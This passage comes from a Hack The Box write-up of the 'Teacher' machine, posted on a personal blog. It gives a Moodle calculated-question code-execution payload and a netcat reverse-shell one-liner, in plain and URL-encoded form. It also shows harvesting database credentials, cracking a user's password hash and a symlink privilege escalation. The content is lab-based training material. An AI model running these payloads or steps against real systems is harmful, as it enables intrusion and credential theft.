+<h4 id="after-some-enumeration-i-didnt-find-anything-interesting--so-i-searched-on-google-and-found-this-article-lets-try-to-reproduce-that-vulnerability">After some enumeration I didn’t find anything interesting , so I searched on Google and found this <a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">article</a>. Let’s try to reproduce that vulnerability.</h4>
+<h4 id="first--we-will-go-to-the-algebra-course-">First , we will go to the <code class="highlighter-rouge">Algebra</code> course :</h4>
+<p><img src="/images/hackthebox/teacher/15.png" alt="" /></p>
+<h4 id="then-we-will-turn-editing-on-">Then we will turn editing on :</h4>
+<p><img src="/images/hackthebox/teacher/16.png" alt="" /></p>
+<h4 id="now-we-can-edit-the-course--so-we-will-choose-any-topic-and-click-on-add-an-activity-or-resource-and-we-will-choose-quiz-">Now we can edit the course , so we will choose any topic and click on <code class="highlighter-rouge">Add an activity or resource</code> and we will choose <code class="highlighter-rouge">Quiz</code> :</h4>
+<p><img src="/images/hackthebox/teacher/17.png" alt="" /></p>
+<h4 id="then-we-will-just-fill-in-the-required-information-">Then we will just fill in the required information :</h4>
+<p><img src="/images/hackthebox/teacher/18.png" alt="" /></p>
+<h4 id="and-click-on-save-and-display">And click on <code class="highlighter-rouge">Save and display</code>.</h4>
+<p><img src="/images/hackthebox/teacher/19.png" alt="" /></p>
+<h4 id="after-that-we-will-click-on-edit-quiz-">After that we will click on <code class="highlighter-rouge">edit quiz</code> :</h4>
+<p><img src="/images/hackthebox/teacher/20.png" alt="" /></p>
+<h4 id="and-add-a-new-question-question-type-will-be-calculated-">And add a new question. Question type will be <code class="highlighter-rouge">Calculated</code> :</h4>
+<p><img src="/images/hackthebox/teacher/21.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/22.png" alt="" /></p>
+<h4 id="again-we-will-fill-in-the-required-information-">Again we will fill in the required information :</h4>
+<p><img src="/images/hackthebox/teacher/23.png" alt="" /></p>
+<h4 id="and-finally-we-reach-the-actual-exploitation--we-will-set-the-answer-formula-to-">And finally we reach the actual exploitation , we will set the answer formula to :</h4>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/*{a*/`$_GET[0]`;//{x}}`
+</code></pre></div></div>
+<p><img src="/images/hackthebox/teacher/24.png" alt="" /></p>
+<h4 id="this-will-allow-us-to-pass-system-commands-through-a-url-parameter-called-0--more-info-about-how-the-exploit-is-working-can-be-found-in-the-previously-mentioned-article">This will allow us to pass system commands through a url parameter called <code class="highlighter-rouge">0</code> , More info about how the exploit is working can be found in the previously mentioned article.</h4>
+<h4 id="after-saving-the-changes-we-will-get-this-page-">After saving the changes we will get this page :</h4>
+<p><img src="/images/hackthebox/teacher/25.png" alt="" /></p>
+<h4 id="we-will-click-on-next-page-to-finally-get-to-the-vulnerable-page-">We will click on <code class="highlighter-rouge">Next Page</code> to finally get to the vulnerable page :</h4>
+<p><img src="/images/hackthebox/teacher/26.png" alt="" /></p>
+<h4 id="lets-add-the-parameter-0-and-get-a-reverse-shell-">Let’s add the parameter <code class="highlighter-rouge">0</code> and get a reverse shell :</h4>
+<h4 id="shell--rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-ip-port-tmpf">Shell : <code class="highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</code></h4>
+<p><img src="/images/hackthebox/teacher/27.png" alt="" /></p>
+<h4 id="note--the-payload-is-url-encoded-so-final-payload-will-be--0rmtmpf3bmkfifotmpf3bcattmpfbinsh-i2261ncipporttmpf">Note : the payload is url encoded. So final payload will be : <code class="highlighter-rouge">&amp;0=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+ip+port+&gt;/tmp/f</code></h4>
+<h4 id="after-sending-the-request--our-listener-gets-a-callback-and-we-get-a-reverse-shell-as-www-data-">After sending the request , our listener gets a callback. And we get a reverse shell as <code class="highlighter-rouge">www-data</code> :</h4>
+<p><img src="/images/hackthebox/teacher/28.png" alt="" /></p>
+<h4 id="there-is-only-giovanni-on-the-box-and-we-cant-access-his-home-directory-as-www-data">There is only <code class="highlighter-rouge">giovanni</code> on the box and we can’t access his <code class="highlighter-rouge">/home</code> directory as <code class="highlighter-rouge">www-data</code>.</h4>
+<p><img src="/images/hackthebox/teacher/29.png" alt="" /></p>
+<hr />
+
+<h3 id="hardcoded-database-credentials--privilege-escalation-to-giovanni">Hardcoded Database Credentials , Privilege Escalation to <code class="highlighter-rouge">giovanni</code></h3>
+<h4 id="back-to-varwwwhtmlmoodle--i-wanted-to-check-config-files-and-other-stuff-to-see-if-there-are-any-information-that-can-help-and-in-configphp-i-found-database-credentials-">Back to <code class="highlighter-rouge">/var/www/html/moodle</code> , I wanted to check config files and other stuff to see if there are any information that can help. And in <code class="highlighter-rouge">config.php</code> I found database credentials :</h4>
+<p><img src="/images/hackthebox/teacher/30.png" alt="" /></p>
+<h4 id="sweet--lets-see-whats-in-there">Sweet , Let’s see what’s in there.</h4>
+<p><code class="highlighter-rouge">mysql -h 127.0.0.1 -u root -p</code>
+<img src="/images/hackthebox/teacher/31.png" alt="" /></p>
+<h4 id="we-are-not-in-any-database-none--lets-list-the-databases-">We are not in any database <code class="highlighter-rouge">[(none)]</code> , Let’s list the databases :</h4>
+<p><code class="highlighter-rouge">SHOW DATABASES;</code>
+<img src="/images/hackthebox/teacher/32.png" alt="" /></p>
+<h4 id="moodle-is-interesting-and-might-have-some-passwords"><code class="highlighter-rouge">moodle</code> is interesting and might have some passwords.</h4>
+<p><code class="highlighter-rouge">USE moodle;</code>
+<img src="/images/hackthebox/teacher/33.png" alt="" /></p>
+<h4 id="now-lets-check-the-tables-">Now let’s check the tables :</h4>
+<p><code class="highlighter-rouge">SHOW TABLES;</code>
+<img src="/images/hackthebox/teacher/34.png" alt="" /></p>
+<h4 id="a-lot-of-tables--but-an-interesting-one-is-called-mdl_user-">A lot of tables , but an interesting one is called <code class="highlighter-rouge">mdl_user</code> :</h4>
+<p><img src="/images/hackthebox/teacher/35.png" alt="" /></p>
+<h4 id="alright--lets-see-whats-in-that-table-">Alright , let’s see what’s in that table :</h4>
+<p><code class="highlighter-rouge">SELECT * from mdl_user;</code>
+<img src="/images/hackthebox/teacher/36.png" alt="" /></p>
+<h4 id="we-didnt-get-the-best-output-d-but-anyway-i-looked-into-it-and-found-this-md5-hash-">We didn’t get the best output :D but anyway I looked into it and found this <code class="highlighter-rouge">md5</code> hash :</h4>
+<p><img src="/images/hackthebox/teacher/37.png" alt="" /></p>
+<h4 id="and-its-name-is-giovannibak--probably-a-backup-for-giovannis-password-crackstation-was-able-to-crack-it-">And its name is <code class="highlighter-rouge">Giovannibak</code> , probably a backup for giovanni’s password. <a href="https://crackstation.net/">crackstation</a> was able to crack it :</h4>
+<p><img src="/images/hackthebox/teacher/38.png" alt="" /></p>
+<h4 id="the-password-is-expelled-we-can-su-to-giovanni">The password is <code class="highlighter-rouge">expelled</code>, we can <code class="highlighter-rouge">su</code> to <code class="highlighter-rouge">giovanni</code></h4>
+<p><img src="/images/hackthebox/teacher/39.png" alt="" /></p>
+<h4 id="now-we-own-user">Now we own user.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="777-ability-to-read--write-and-execute-anything-on-the-system"><code class="highlighter-rouge">777</code>. Ability to read , write and execute anything on the system</h3>
+<h4 id="in-giovannis-home-directory-there-is-a-directory-called-work-which-has-two-directories-courses-and-tmp-nothing-special">In giovanni’s <code class="highlighter-rouge">/home</code> directory there is a directory called <code class="highlighter-rouge">work</code> which has two directories <code class="highlighter-rouge">courses</code> and <code class="highlighter-rouge">tmp</code>. Nothing Special.</h4>
+<p><img src="/images/hackthebox/teacher/40.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/41.png" alt="" /></p>
+<h4 id="after-a-lot-of-enumeration-i-found-in-usrbin-a-script-called-backupsh-">After a lot of enumeration I found in <code class="highlighter-rouge">/usr/bin</code> a script called <code class="highlighter-rouge">backup.sh</code> :</h4>
+<p><img src="/images/hackthebox/teacher/42.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/43.png" alt="" /></p>
+<h4 id="we-dont-really-care-about-the-tar-commands--what-we-care-about-is-that-its-changing-current-directory-to-homegiovanniwork-then-changes-it-once-again-to-homegiovanniworktmp-then-changes-permissions-to-777-recursively-this-means-that-any-user-can-read--write-and-execute-any-file-in-homegiovanniworktmp-so-if-we-created-a-symlink-for-root-in-homegiovanniworktmp-we-will-have-access-to-root-in-normal-conditions-creating-a-symlink-to-root-wont-let-you-have-access-to-it-if-you-dont-have-the-permissions-to-because-its-still-linking-to-a-directory-that-you-are-not-authorized-to-access-but-since-homegiovanniworktmp-has-permissions-set-to-777--anyone-has-access-to-whats-in-there-even-symlinks-this-article-explains-it-very-well-read-this-if-you-dont-know-whats-a-symlink">We don’t really care about the <code class="highlighter-rouge">tar</code> commands , What we care about is that it’s changing current directory to <code class="highlighter-rouge">/home/giovanni/work</code> then changes it once again to <code class="highlighter-rouge">/home/giovanni/work/tmp</code> then changes permissions to <code class="highlighter-rouge">777</code> recursively. This means that any user can read , write and execute any file in <code class="highlighter-rouge">/home/giovanni/work/tmp</code>. So if we created a symlink for <code class="highlighter-rouge">/root</code> in <code class="highlighter-rouge">/home/giovanni/work/tmp</code> we will have access to <code class="highlighter-rouge">/root</code>. In normal conditions creating a symlink to <code class="highlighter-rouge">/root</code> won’t let you have access to it if you don’t have the permissions to. Because it’s still linking to a directory that you are not authorized to access. But since <code class="highlighter-rouge">/home/giovanni/work/tmp</code> has permissions set to <code class="highlighter-rouge">777</code> , Anyone has access to what’s in there even symlinks. This <a href="https://www.maketecheasier.com/file-permissions-what-does-chmod-777-means/">article</a> explains it very well. Read <a href="https://stackabuse.com/symbolic-links-in-unix-linux/">this</a> if you don’t know what’s a symlink.</h4>
+<h4 id="alright--lets-create-a-symlink-for-root-in-homegiovanniworktmp">Alright , Let’s create a symlink for <code class="highlighter-rouge">/root</code> in <code class="highlighter-rouge">/home/giovanni/work/tmp</code></h4>
+<p><code class="highlighter-rouge">ln -s /root ./tmp</code>
+<img src="/images/hackthebox/teacher/44.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/teacher/45.png" alt="" /></p>
+<h4 id="and-we-owned-root-">And we owned root !</h4>
+<p><br />
+<br /></p>
+<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
+<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
+<h4 id="thanks-for-reading">Thanks for reading.</h4>
+<p><br />
+<br /></p>
+<h4 id="previous-hack-the-box-write-up--hack-the-box---redcross">Previous Hack The Box write-up : <a href="/hack-the-box/redcross/">Hack The Box - RedCross</a></h4>
+<hr />
+
+
+  </div>
+<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/teacher/" hidden></a>
+</article>
+
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">0xRick Owned Root !</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">0xRick Owned Root !</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
+
